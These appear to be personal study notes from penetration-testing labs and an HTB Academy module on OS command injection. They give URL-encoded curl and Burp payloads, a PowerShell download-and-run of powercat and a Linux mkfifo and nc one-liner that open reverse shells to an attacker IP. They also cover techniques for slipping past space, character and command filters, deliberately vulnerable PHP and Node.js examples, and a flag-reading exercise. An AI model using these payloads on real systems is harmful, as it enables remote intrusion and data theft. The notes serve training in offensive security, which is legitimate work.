# how to detect?

![[Pasted image 20240427210530.png]]

check for any input field and search whether it can run any command?
### yes?
then run command with `;` like `git;ifconfig`

## works then it's cmd execution


now check what is the input field and how it is processing data

now you can do with curl & burp both

## curl

![[Pasted image 20240427211110.png]]

```
curl -X POST --data 'Archive=git%3Bipconfig' http://$IP:8000/archive
```

#check-shell
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

### don't forget URL encoding
```
curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive
```

### transfer powercat (as it's windows)

```
IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.231/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```

start server and catch request

![[Pasted image 20240427211708.png]]

```
curl -X POST --data 'Archive=git%3BIEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%22http%3A%2F%2F192.168.45.231%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.231%20-p%204444%20-e%20powershell' http://192.168.164.189:8000/archive
```

## burp (easy)

catch request in repeater and fire that powercat with url encoded while server and listener is on!

![[Pasted image 20240427211825.png]]

```
Archive=git%3BIEX%20%28New-Object%20Net.WebClient%29.DownloadString%28%22http%3A%2F%2F192.168.45.231%2Fpowercat.ps1%22%29%3Bpowercat%20-c%20192.168.45.231%20-p%204444%20-e%20powershell
```
MAIN PART

### is it linux?

```
http://192.168.45.231/nc;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.231 4444 >/tmp/f
```

download nc and then get reverse shell

```
wget http://192.168.45.231/nc;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.231 4444 >/tmp/f
```

again, DON'T FORGET TO ENCODE FOR LINUX!

![[Pasted image 20240427213924.png]]

![[Pasted image 20240427213943.png]]


--------------------------------------------------------------------------

----

# HTB academy

## Types

OS cmd
SQLi 
Code execution
Cross-Site Scripting/HTML Injection

**STILL there are many more**, Xpath, LDAP

### Example PHP and Node.js code
```
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>

```

```
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```



### some important character

| Operator   | Injection Character | URL-encoded character | Executed command                |
| ---------- | ------------------- | --------------------- | ------------------------------- |
| Semicolon  | `;`                 | `%3b`                 | Both                            |
| New Line   | `\n`                | `%0a`                 | Both                            |
| Background | `&`                 | `%26`                 | Both (second show first mostly) |
| Pipe       | \|                  | `%7c`                 | Both (only second shown)        |
| AND        | `&&`                | `%26c%26c`            | Both (only if first succeeds)   |
| OR         | \|\|                | `%7c%7c`              | Second (only if first fails)    |
| Sub-shell  | ``                  | `%60%60`              | Both (Linux-only)               |
| Sub-shell  | `$()`               | `%24%28%29`           | Both (Linux-only)               |

> [!NOTE]
> The only exception may be the semi-colon ;, which will not work if the command was being executed with Windows Command Line (CMD), but would still work if it was being executed with Windows PowerShell.


### Check if error msg come from backend or frontend

We can double-check this with the Firefox Developer Tools by clicking [CTRL + SHIFT + E] to show the Network tab and then clicking on the Check button again

![[Pasted image 20240502133907.png]]

However, it is very common for developers only to perform input validation on the front-end while not validating or sanitizing the input on the back-end.


## Bypassing Front-End Validation

```
curl -X POST --data 'ip=127.0.0.1%3b+whoami' http://$IP
```

![[Pasted image 20240502134506.png]]

we can bypass it with URL encode and injection character

![[Pasted image 20240502134742.png]]


## Filter/WAF Detection

> [!NOTE]
> If the error message displayed a different page, with information like our IP and our request, this may indicate that it was denied by a WAF

![[Pasted image 20240502135506.png]]

### Digging method

#### payload
```
127.0.0.1; whoami
```

Other than the IP (which we know is not blacklisted), we sent:

    A semi-colon character ;
    A space character
    A whoami command

### Solution

**Try different injection operator**


## Bypassing Space Filters

### Bypass Blacklisted Operators

Mostly, the new-line character is usually not blacklisted, as it may be needed in the payload itself

```
127.0.0.1%0a
```

If we get output of this **which means that this character is not blacklisted, and we can use it as our injection operator**

if we give payload like,
```
127.0.0.1%0a whoami
```

which have `space` in it and we get denied request then it means `space` is blacklisted

### Solution

#### Using tabs %09

both Linux and Windows accept commands with tabs between arguments, and they are executed the same

```
127.0.0.1%0a%09
```

![[Pasted image 20240502141644.png]]

#### Using $IFS ${IFS}

the ($IFS) Linux Environment Variable may also work since its default value is a space and a tab, which would work between command arguments

```
127.0.0.1%0a${IFS}
```

![[Pasted image 20240502141851.png]]

#### Using Brace Expansion
```
127.0.0.1%0a{ls,-la}
```



## Bypassing Other Blacklisted Characters

Besides injection operators and space characters, a very commonly blacklisted character is the slash (/) or backslash (\) character, as it is necessary to specify directories in Linux or Windows

### Linux

we can see all env variable with `printenv` and see what character we need and extract it

![[Pasted image 20240502142905.png]]

we can leverage `$PATH` and specify start and length of that particular character we want and extract it

```
echo $PATH
```

![[Pasted image 20240502142349.png]]

#### extract `/`

```
echo ${PATH:0:1}
```

![[Pasted image 20240502142438.png]]

> [!NOTE]
> When we use the above command in our payload, we will not add echo, as we are only using it in this case to show the outputted character.

#### extract `;`

```
echo ${LS_COLORS:10:1}
```

![[Pasted image 20240502142711.png]]

#### and we successfully pass blacklisted operator `;` and character `space`

![[Pasted image 20240502143129.png]]

### windows

#### extract `\`

CMD
```
echo %HOMEPATH:~6,-11%
```

![[Pasted image 20240502143617.png]]

POWERSHELL
```
$env:HOMEPATH[0]
```

![[Pasted image 20240502143729.png]]

```
$env:PROGRAMFILES[10]
```

gives space

#### character shifting

suppose if we want `\` which is 92 in ascii so use `[` character which is 91 in ascii

```
echo $(tr '!-}' '"-~'<<<[)
```

below gives `;`
; -> 59
so use 58 character in ascii
```
echo $(tr '!-}' '"-~'<<<:)
```



## Bypass blacklisted commands

![[Pasted image 20240502151322.png]]

sometimes it happened that commands also get blacklisted

```
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

> [!NOTE]
> One very common and easy obfuscation technique is inserting certain characters within our command that are usually ignored by command shells like Bash or PowerShell and will execute the same command as if they were not there. Some of these characters are a single-quote ' and a double-quote ", in addition to a few others.

### quote is easiest way

![[Pasted image 20240502152158.png]]

#### Linux ONLY
![[Pasted image 20240502153210.png]]

#### Windows ONLY
![[Pasted image 20240502153247.png]]


# Exercise
find username in /home directory with command injection

```
127.0.0.1%0als${IFS}${PATH:0:1}home
```

read flag

```
127.0.0.1%0ah$@ead${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

127.0.01\n
head /home/injector/flag.txt
```

![[Pasted image 20240502154341.png]]